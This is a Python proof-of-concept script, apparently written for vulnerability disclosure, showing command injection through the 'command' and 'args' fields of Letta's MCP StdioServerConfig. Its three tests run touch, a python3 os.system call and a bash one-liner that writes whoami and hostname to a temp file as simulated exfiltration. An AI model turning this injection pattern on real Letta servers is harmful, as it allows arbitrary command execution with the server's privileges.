#!/usr/bin/env python3
"""
🚨 Proof of Concept for Command Injection Vulnerability in Letta MCP Implementation
This PoC demonstrates the command injection vulnerability in Letta's MCP StdioServerConfig

⚠️  Warning: This script is for security research and vulnerability demonstration purposes only!
"""

import asyncio
import sys
import tempfile
from pathlib import Path

# Add the letta source path to import modules
sys.path.insert(0, str(Path(__file__).parent))

from letta.services.mcp.stdio_client import AsyncStdioMCPClient
from letta.services.mcp.types import StdioServerConfig, MCPServerType


async def demonstrate_command_injection():
    """
    Demonstrate command injection vulnerability in Letta's MCP StdioServerConfig
    """
    
    print("🚨 [Vulnerability Demonstration] Letta MCP Command Injection PoC")
    print("=" * 60)
    
    # Create a temporary file to prove command execution
    temp_file = tempfile.mktemp(suffix=".txt")
    print(f"📁 Target file for proof: {temp_file}")
    
    # Vulnerability 1: Direct command injection via command parameter
    print("\n🚨 [Test 1] Direct command injection via 'command' parameter")
    malicious_config_1 = StdioServerConfig(
        server_name="malicious_server_1",
        type=MCPServerType.STDIO,
        command="touch",  # ← Malicious command instead of legitimate MCP server
        args=[temp_file],  # ← Arguments to create proof file
        env={}
    )
    
    print(f"   Command: {malicious_config_1.command}")
    print(f"   Args: {malicious_config_1.args}")
    
    try:
        # This will execute: touch /tmp/...
        client = AsyncStdioMCPClient(malicious_config_1)
        await client.connect_to_server()
        print("   ✅ Command executed successfully!")
        
        # Check if the file was created
        if Path(temp_file).exists():
            print(f"   ✅ Proof file created: {temp_file}")
            Path(temp_file).unlink()  # Clean up
        else:
            print("   ❌ Proof file not found")
            
    except Exception as e:
        print(f"   ⚠️  Connection failed but command may have executed: {e}")
        # Check if file was still created despite connection failure
        if Path(temp_file).exists():
            print(f"   ✅ Proof file created despite error: {temp_file}")
            Path(temp_file).unlink()  # Clean up
    
    # Vulnerability 2: Command injection via args parameter
    print("\n🚨 [Test 2] Command injection via 'args' parameter")
    temp_file_2 = tempfile.mktemp(suffix="_args.txt")
    
    malicious_config_2 = StdioServerConfig(
        server_name="malicious_server_2", 
        type=MCPServerType.STDIO,
        command="python3",  # Legitimate-looking command
        args=["-c", f"import os; os.system('touch {temp_file_2}')"],  # ← Malicious args
        env={}
    )
    
    print(f"   Command: {malicious_config_2.command}")
    print(f"   Args: {malicious_config_2.args}")
    
    try:
        client = AsyncStdioMCPClient(malicious_config_2)
        await client.connect_to_server()
        print("   ✅ Command executed successfully!")
        
        # Check if the file was created
        if Path(temp_file_2).exists():
            print(f"   ✅ Proof file created: {temp_file_2}")
            Path(temp_file_2).unlink()  # Clean up
        else:
            print("   ❌ Proof file not found")
            
    except Exception as e:
        print(f"   ⚠️  Connection failed but command may have executed: {e}")
        # Check if file was still created despite connection failure
        if Path(temp_file_2).exists():
            print(f"   ✅ Proof file created despite error: {temp_file_2}")
            Path(temp_file_2).unlink()  # Clean up
    
    # Vulnerability 3: More sophisticated attack - data exfiltration simulation
    print("\n🚨 [Test 3] Simulated data exfiltration attack")
    temp_file_3 = tempfile.mktemp(suffix="_exfil.txt")
    
    malicious_config_3 = StdioServerConfig(
        server_name="data_exfil_server",
        type=MCPServerType.STDIO,
        command="bash",
        args=["-c", f"echo 'Sensitive data: $(whoami)@$(hostname)' > {temp_file_3}"],
        env={}
    )
    
    print(f"   Command: {malicious_config_3.command}")
    print(f"   Args: {malicious_config_3.args}")
    
    try:
        client = AsyncStdioMCPClient(malicious_config_3)
        await client.connect_to_server()
        print("   ✅ Command executed successfully!")
        
        # Check if the file was created and read its contents
        if Path(temp_file_3).exists():
            content = Path(temp_file_3).read_text().strip()
            print(f"   ✅ Exfiltrated data: {content}")
            Path(temp_file_3).unlink()  # Clean up
        else:
            print("   ❌ Proof file not found")
            
    except Exception as e:
        print(f"   ⚠️  Connection failed but command may have executed: {e}")
        # Check if file was still created despite connection failure
        if Path(temp_file_3).exists():
            content = Path(temp_file_3).read_text().strip()
            print(f"   ✅ Exfiltrated data despite error: {content}")
            Path(temp_file_3).unlink()  # Clean up
    
    print("\n" + "=" * 60)
    print("🚨 [Summary] Vulnerability Demonstration Complete")
    print("   The Letta MCP implementation is vulnerable to command injection")
    print("   through both 'command' and 'args' parameters in StdioServerConfig")
    print("   Attackers can execute arbitrary system commands with the privileges")
    print("   of the Letta server process.")
    print("=" * 60)


if __name__ == "__main__":
    print("🚨 Starting Letta MCP Command Injection PoC...")
    print("⚠️  Warning: This PoC demonstrates a serious security vulnerability!")
    print()
    
    try:
        asyncio.run(demonstrate_command_injection())
    except KeyboardInterrupt:
        print("\n⚠️  PoC interrupted by user")
    except Exception as e:
        print(f"\n❌ PoC failed with error: {e}")
        import traceback
        traceback.print_exc()
